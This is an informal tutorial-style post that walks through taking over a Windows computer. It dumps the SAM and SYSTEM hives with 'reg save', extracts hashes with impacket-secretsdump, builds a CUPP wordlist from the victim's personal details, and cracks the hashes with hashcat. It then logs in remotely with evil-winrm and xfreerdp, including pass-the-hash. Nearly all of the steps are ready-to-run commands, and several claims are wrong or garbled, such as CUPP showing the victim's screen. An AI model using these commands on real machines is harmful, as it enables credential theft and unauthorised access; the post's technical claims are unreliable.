So let's you have a password in your Windows Computer, which is a very good thing.

Windows doesn't just your passwords in plain text form.

It is stored in the form of something called HASH.

If you don't what a HASH is, read this Wikipedia Article

For the sake of education we will assume that your password is:

Sup3rs3RETP@@$$word

Which is a good password and indicated that you used some kind of password generator to generate this. Even then you will be hacked.

After you set this password, it will be went through a hashing algorithm. Which in this case is:

MD4 Hashing algorithm after which it will look like somebody chewed and spat out.

After hashing the password will look something like this:

ca0a1e55c19606f471a5b3ecf8054271

So whenever you type in the password it will again go through the MD4 Hashing algorithm and if the hashes match, you will login.

This hash is what the hacker needs to get into your Computer from his.

While it would not immediately tell the hacker what the hash is, it will, the hacker will crack it.

Actually not entirely the hacker because he will need some softwares.

Now lets talk about the process through which the Hacker will get the hash, and break into your computer.


  • Get access to your system once.

    • He or she will need the access to your computer atleast once to get the files needed from your computer to get the hash.

    After getting physical access to your computer once, he will try his or her best to get the files as quickly as possible.


  • Get the files

    • He will search for Resgistry Editor

    He will get the UAC prompt saying that "Do you want to allow this applcation to make changes to your system?" which you might also get while installing anything on your Windows machine. On which the hacker will click yes.

    He will ofcource just click yes. Luckily for him, you are the administrator on your system.

    Then he will go to HKEY_LOCAL_MACHINE.

    There he will see files or folders called SAM and SYSTEM.

    Lets say he does it with the command prompt.

    After in CMD he will type the following command to get the sam file:

    $ reg save HKLM\sam ./sam.save

    And this one to get the systme file:

    $ reg save HKLM\system ./system.save

  • Get the files in a flash drive.

    • He will get the flash drive, plug it in your computer and copy (or cut) the files and paste it into the flash drive.




Now that he has the files needed to get the hash, he will go back to his Kali Linux Machine.



  • Plug the flash drive into his computer.

    • Does it even need to be explained? Isn't it so clear that he pluged it into his computer.



  • Unpack the files to get hash

    • The tool generally used to grab the hash out of SAM and SYSTEM files is called impacket-secretsdump, that is a very wierd name. It is built into Kali Linux.

    If the hacker isn't using Kali, he will type in this command in the terminal to get it:

    $ sudo apt search impacket

    Then he install it with this command:

    $ sudo apt install impacket


  • Get the hash

    • To get the hash, he will run this command:

    $ impacket-secretsdump -sam sam.save -system system.save LOCAL

    And there goes your Hash.

    He got your Hash in three-four lines of termianl.



  • Crack the password

    • Generally in older times Hackers used Brute Force Attacks which means keep guessing passwords until they get it correct. But this method is useless after mordern password-generators became popular, as they had no pattern and the passwords were very random.

    If you want a good password generator I have one that I made, it is totally safe and the passwords are very random.

    Try it out your self.

    The hacker will need a list of passwords that could be your password. Probably 20,000 passwords, 50,000 passwords, 100,000 passwords. Unluckily or Luckily there are tools that can automate that.

    Now he will use a tool called CUPP to get the hash and see what is happening on the screen of the target.



  • Use CUPP to get your password through your details.

    • He will use CUPP to get your password through your Name, IP, Birthdate and other things to get your passwords and see the things happening on your screen.

    $ cupp -i

    Now he will type your details to get your passwords.

    They will ask for your Full Name, Birthdate, Wife's name, child's name, company name etc.

    Then CUPP will generate a list of passwords that could be your password.



  • Now try to get your password from the list of passwords.

    • There is a very popular tool for this called hashcat.

    He will now use hashcat to get your password.

    $ sudo hashcat -m 1000 hash.txt listofpasswords.txt

    1000 is NTLM algorithm that Windows uses. hash.txt is the file that has the hash of the Windows computer. listofpasswords.txt is the list of passwords CUPP generated.

    Now he will see that the Status of password is CRACKED.

    Now he will use this command to show the password:

    $ sudo hashcat -m 1000 hash.txt listofpasswords.txt --show

    Now he will have the Hash and the password. Now all that is left to do is see the things happening on your screen.



  • EVIL-WINRM

    • Evil-WINRM is a tool often used in cybersecurity assesments and penetration testing. It leverages the WINRM protocol to exploit potential vulnerabilities in Windows Systems.

    He will type this command to get access to your PowerShell and Eventually your screen.

    $ evil-winrm -i yo.ur.ip.addr -u yourusername -p thecrackedpassword

    That gave the hacker the access to your systme's PowerShell.

    Now the access to your screen.

    $ xfreedp /v: yo.ur.ip.addr /u: yourusername /p: thecrackedpassword

    Now let's talk about the ways that hacker can get to your PowerShell with just the Hash with this command:

    $ evil-winrm -i yo.ur.ip.addr -u yourusername -H thehashgotfromthefiles

    Another thing that can be used to getcthe screen access without password with Pass The Hash Algorithm

    $ xfreedp /v: yo.ur.ip.addr /u: yourusername /pth: thehashgotfromthefiles
